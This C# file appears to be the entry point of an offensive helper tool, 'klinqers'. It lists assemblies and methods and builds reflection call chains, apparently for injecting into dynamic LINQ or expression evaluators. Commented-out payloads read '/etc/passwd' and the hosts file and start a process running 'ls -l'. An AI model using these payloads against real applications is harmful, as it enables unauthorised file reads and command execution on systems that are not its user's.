using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

namespace klinqers
{
    class MainClass
    {




        public static void Main(string[] args)
        {
            //"c:/windows/system32/hosts".Split(";".ToCharArray())
            //"".GetType().Assembly.GetType("System.IO.File").GetMethods()[29].Invoke(null, new object[] { }).ToString();

            //object obj = "".GetType().Assembly.GetType("System.IO.File").GetMethods()[29].Invoke(null, "/etc/passwd".Split(";".ToCharArray())).ToString();

            //object obj = "".GetType().Assembly.GetType("System.AppDomain").GetMethods()[18].Invoke("".GetType().Assembly.GetType("System.AppDomain").GetProperty("CurrentDomain").GetValue(null), "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;System.Diagnostics.Process".Split(";".ToCharArray())).GetType().GetMethods()[44].Invoke(null, "ls;-l".Split(";".ToCharArray()));



            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--assemblies")
                {
                    Console.WriteLine("[+] Creating list for all assemblies in appdomain");
                   
                    Klinqers.printAssemblies();
                }
                else if ((i + 1) < args.Length)
                {
                    if (args[i] == "--type")
                    {
                        string strType = args[++i];

                        Console.WriteLine("[+] Creating list for " + strType);

                        Type type = Type.GetType(strType);

                        Klinqers.printMethodsForType(type);
                    }
                    else if (args[i] == "--call")
                    {
                        string strCall = args[++i];

                        Console.WriteLine("[+] Creating call for " + strCall);

                        string strCompiled = Klinqers.getCall(strCall);

                        if (strCompiled != null)
                        {
                            Console.WriteLine(strCompiled);
                        }
                    }

                }
            }
        }




    }
}
